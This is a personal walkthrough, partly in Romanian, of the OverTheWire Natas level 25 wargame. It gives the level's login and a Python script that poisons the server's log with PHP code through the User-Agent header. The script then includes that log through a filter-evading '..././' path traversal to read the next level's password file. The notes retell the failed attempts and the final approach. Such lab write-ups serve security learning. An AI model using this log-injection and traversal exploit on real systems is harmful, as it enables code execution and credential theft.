
# General info

Username: natas25
Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
URL:      http://natas25.natas.labs.overthewire.org

# Special code section

```py
import requests

php_injection = "<?php echo \"Password: \"; echo file_get_contents(\"/etc/natas_webpass/natas26\")  ?>"

response = requests.get(
    url="http://natas25.natas.labs.overthewire.org",
    auth=("natas25", "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws"),
    params={
        "lang" : "../"
    },
    headers={
        "User-Agent" : f'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 {php_injection}'
    }
)

session_id = response.cookies.get_dict()["PHPSESSID"]

path = "..././" * 10 + "/var/www/natas/natas25/logs/natas25_" + session_id + ".log"

response = requests.get(
    url="http://natas25.natas.labs.overthewire.org",
    auth=("natas25", "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws"),
    params={
        "lang" : path
    }
)

print(response.text)
# Current dir: /var/www/natas/natas25/language
# Sa faci path-ul in UTF-8 ca dupa sa il transmiti mai departe nu merge
# Nici hex nu merge - pur si simplu il ignora
```

Am inceput prin a intelege codul. 
Era clar ca nu pot face `path traversal` in mod obisnuit cu `../`, pentru ca era suprascris.
Dupa, am inteles ca partea de `listFiles` nu ma ajuta, functia executa mereu acelasi lucru.
Am incercat sa trimit path-ul sub forma de UTF-8, dar UTF-8 are acelasi valori ca ASCII pentru path, ceea ce nu m-a ajutat.
Dupa, am incercat sa il trimit in hex, crezand ca o sa mearga, dar n-am ajuns nicaieri.

Intr-un final, mi-am dat seama ca trebuie sa existe o metoda de a face path traversal pe care nu o stiu eu.
`~` nu puteam folosi, deoarece e interpretata la nivel de shell.
Am incercat sa trimit un `"lang" : "/bin/bash"` crezand ca acel `include()` va executa fisierul, dar nu asa functioneaza, iar asta am inteles-o mai tarziu.
Uitandu-ma pe writeups, am vazut `....//` si am crezut ca e un bug in PHP - dar ideea era alta.
Din `....//` daca elimini `../` ramai cu `../`.
E acelasi lucru ca `aaAABBbb` cand elimini `AABB` si ramai cu `aabb`.
Dupa, am vazut un hint catre acea functie de logging - care m-a dus la acest articol https://owasp.org/www-community/attacks/Log_Injection.
De acolo, am inteles cam ce ar trebui sa fac, am incropit un snippet de PHP care sa citeasca fisierul meu, l-am incarcat, dupa am `include()` acel fisier folosind path traversal-ul de mai inainte + session ID-ul.